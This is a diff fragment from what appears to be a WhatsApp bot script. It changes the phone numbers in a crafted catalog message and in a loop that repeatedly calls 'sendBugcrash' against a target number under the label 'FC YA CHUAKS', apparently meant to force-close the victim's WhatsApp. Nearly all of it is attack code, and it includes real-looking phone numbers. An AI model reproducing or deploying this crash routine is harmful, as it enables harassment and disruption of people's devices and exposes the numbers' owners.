@@ -20,9 +20,9 @@ CATALOG :
     "firstImageId": 1,
     "salePriceAmount1000": "1000",
     "retailerId": `Nomor Owner Di Atas`,
-    "url": `https://wa.me/0`
+    "url": `https://wa.me/089699565795`
     },
-    "businessOwnerJid": "6281226416919@s.whatsapp.net",
+    "businessOwnerJid": "6289699565795@s.whatsapp.net",
     }
     }), { userJid: from, quoted: lep  })
     ap.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -51,7 +51,7 @@ CATALOG :
              jumlah = '2'
             waktu = '3s'
             for (let i = 0; i < jumlah; i++) {
-            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6281226416919@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6289699565795@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
             await sleep(ms(waktu))
             }
             }
